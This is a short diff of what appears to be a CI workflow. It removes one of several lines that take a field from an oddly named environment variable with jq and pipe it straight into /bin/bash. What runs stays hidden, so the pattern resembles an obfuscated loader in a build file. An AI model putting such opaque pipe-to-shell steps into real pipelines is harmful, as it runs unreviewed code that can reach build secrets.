@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$aht6" | jq -r .xq98 | /bin/bash
           echo $g26606 | jq -r .tm3483 | /bin/bash
-          echo $tl2 | jq -r .y999 | /bin/bash
           echo $ojf2285 | jq -r .hf78 | /bin/bash
 
       - name: Archive artifact
